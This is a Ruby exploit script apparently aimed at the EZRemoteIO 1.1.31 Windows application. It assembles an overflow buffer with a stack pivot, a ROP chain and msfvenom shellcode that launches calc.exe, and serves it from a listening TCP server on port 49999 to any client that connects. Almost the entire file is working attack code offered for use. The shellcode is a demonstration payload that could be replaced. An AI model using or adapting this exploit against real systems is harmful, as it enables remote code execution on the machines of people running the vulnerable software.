#!/usr/bin/env ruby
# https://www.ezautomation.net/access.php
# https://www.ezautomation.net/downloads/EZRemoteIO%201.1.31%20(FULL)%20Setup.exe
# when "Choose Port:" is ethernet then from EZRemoteIO "Read Ethernet Settings" 
# Tested against Windows7 SP1

require 'rex'
require 'socket'

stackflip = [0x05103e3a].pack('V')
ropnop    = [0x7c3a4016].pack('V')* 12

rop = 
   [
      0x7c363c10,  
      0x7c37a094, 
      0x05102cd0,  
      0x050d737b,  
      0x7c3661dc,  
      0x050f4d23, 
      0x050c9940,  
      0xffffffff, 
      0x0511156a,  
      0x7c34280f,  
      0xffffffff,   
      0x7c345255,  
      0x050d7e37,  
      0x7c34592b,  
      0xffffefff, 
      0x7c351eb1,  
      0x050ca367,  
      0x41414141, 
      0x0511a1bc,  
      0xffffffc0, 
      0x7c3b2c65,  
      0x050c5947,  
      0x7c3a8883,  
      0x41414141, 
      0x41414141, 
      0x7c3a4016, 
      0x7c347f97,  
      0x90909090, 
      0x050db9b0, 
   ].pack("V*")

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x20\x0d\x0a' -f ruby

payload =
"\x81\xc4\x54\xf2\xff\xff" + 
"\xba\x90\xaf\x74\x60\xda\xc8\xd9\x74\x24\xf4\x5d\x2b\xc9" +
"\xb1\x31\x83\xc5\x04\x31\x55\x0f\x03\x55\x9f\x4d\x81\x9c" +
"\x77\x13\x6a\x5d\x87\x74\xe2\xb8\xb6\xb4\x90\xc9\xe8\x04" +
"\xd2\x9c\x04\xee\xb6\x34\x9f\x82\x1e\x3a\x28\x28\x79\x75" +
"\xa9\x01\xb9\x14\x29\x58\xee\xf6\x10\x93\xe3\xf7\x55\xce" +
"\x0e\xa5\x0e\x84\xbd\x5a\x3b\xd0\x7d\xd0\x77\xf4\x05\x05" +
"\xcf\xf7\x24\x98\x44\xae\xe6\x1a\x89\xda\xae\x04\xce\xe7" +
"\x79\xbe\x24\x93\x7b\x16\x75\x5c\xd7\x57\xba\xaf\x29\x9f" +
"\x7c\x50\x5c\xe9\x7f\xed\x67\x2e\x02\x29\xed\xb5\xa4\xba" +
"\x55\x12\x55\x6e\x03\xd1\x59\xdb\x47\xbd\x7d\xda\x84\xb5" +
"\x79\x57\x2b\x1a\x08\x23\x08\xbe\x51\xf7\x31\xe7\x3f\x56" +
"\x4d\xf7\xe0\x07\xeb\x73\x0c\x53\x86\xd9\x5a\xa2\x14\x64" +
"\x28\xa4\x26\x67\x1c\xcd\x17\xec\xf3\x8a\xa7\x27\xb0\x65" +
"\xe2\x6a\x90\xed\xab\xfe\xa1\x73\x4c\xd5\xe5\x8d\xcf\xdc" +
"\x95\x69\xcf\x94\x90\x36\x57\x44\xe8\x27\x32\x6a\x5f\x47" +
"\x17\x09\x3e\xdb\xfb\xe0\xa5\x5b\x99\xfc"

buff = Rex::Text.rand_text_alpha_upper(5024) 
buff[328,ropnop.size] = ropnop
buff[376,rop.size + payload.size] = rop + payload.force_encoding("ASCII-8BIT")
buff[1004, stackflip.size] = stackflip

server = TCPServer.new 49999

loop do
  client =  server.accept
  select(nil,nil,nil,0) 
  client.write(buff)
end
